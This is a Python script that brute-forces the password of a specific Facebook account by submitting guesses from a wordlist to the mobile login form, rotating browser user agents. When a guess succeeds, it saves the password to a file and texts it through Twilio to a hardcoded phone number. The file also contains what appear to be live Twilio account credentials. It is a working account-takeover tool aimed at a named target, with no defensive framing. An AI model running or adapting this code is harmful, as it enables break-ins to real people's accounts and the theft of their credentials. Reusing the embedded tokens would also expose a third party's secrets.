import mechanize
import sys
import random
import http.cookiejar
from bs4 import BeautifulSoup
from twilio.rest import Client 
import time

#id_target="100072606633679"  #عادل الشمري
id_target="100052645953536"   
wl="list.txt"

LOGIN_URL ='https://m.facebook.com/login.php'



def sendPassword(PasswordTrue,email):
    account_sid = 'ACb981b9f48881694c8b3c617ed3f66e07' 
    auth_token = '4bcefff13edb3c28116d264a858a8f53' 
    client = Client(account_sid, auth_token) 
 
    message = client.messages.create(  
                              messaging_service_sid='MG95b8c8a9b6c78255e6ba39a0c40841f8', 
                              body=PasswordTrue+' >> '+email,      
                              to='+46724434404' 
                          ) 
 
     #print(message.sid)



def useragent():
        useragents=[
            'Mozilla/5.0 (X11; Linux x86_64)AppleWebkit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36'
            'Mozilla/5.0 (X11; Linux x86_64)AppleWebkit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.75 Safari/537.36'
            'Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36'
            'Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1'
            'Mozilla/5.0 (iPhone; CPU iPhone OS 12_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Crios/69.0.3497.105 Mobile/15E148 Safari/605.1'
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135  Safari/537.36 Edge/12.246'
            'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.24 (KHTML, like Gecko) rockMelt/0.9.58.494 Chrome/11.0.696.71  Safari/534.24',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.54 Safari/535.2',
            'Opera/9.80 (J2ME/MIDP; Opera Mini/9.80 (S60; SymbOS; Opera Mobi/23.348; U; en) Presto/2.5.25 Version/10.54',
            'Mozilla/5.0 (X11; Linux x86_64)AppleWebkit/535.11 (KHTML, like Gecko) Chrome/17.0.963.12 Safari/535.11',
            'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.6 (KHTML, like Gecko) Chrome/16.0.897.0  Safari/535.6',
            'Mozilla/5.0 (X11; Linux x86_64 rv:17.0) Gecko/20121202 Firefox/17.0 Iceweasel/17.0.1'
        ]

        return random.choice(useragents)


cookielib = http.cookiejar
cj=cookielib.LWPCookieJar()

br = mechanize.Browser()
br.set_cookiejar(cj)
br.set_handle_robots(False)
br.set_handle_redirect(True)
br.set_handle_referer(True)
br.set_handle_equiv(True)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-agent',useragent())]

try:
    w=open(wl,"r")
    c=0
    for password in w.readlines():
        password=password.rstrip("\n")
       # time.sleep(0.5)
        br.open(LOGIN_URL)
        br.select_form(nr=0)
        br.form['email'] = id_target
        br.form['pass'] = password
        data1=br.submit()
        data2=data1.get_data()
        soup=BeautifulSoup(data2,"html.parser")
        for i in soup.find_all("a"):
             print(i.text)
             if "save-device" in str(i):
                 print("<<<<<<<<  >>>>>>  Password-Found  >>>>>>  ",password)
                 savepass=open("SavePass.txt","a")
                 savepass.write(id_target)
                 savepass.write("  >>>> ")
                 savepass.write(password)
                 savepass.write("\n")
                 savepass.close()
                 sendPassword(password,id_target)
                 sys.exit()
             else:
                 #print(c,"-- Wrong Password--",password)
                 c=c+1
except:
    print(" [-]")      
  
#Final Version 7/12/2021 8:45 PM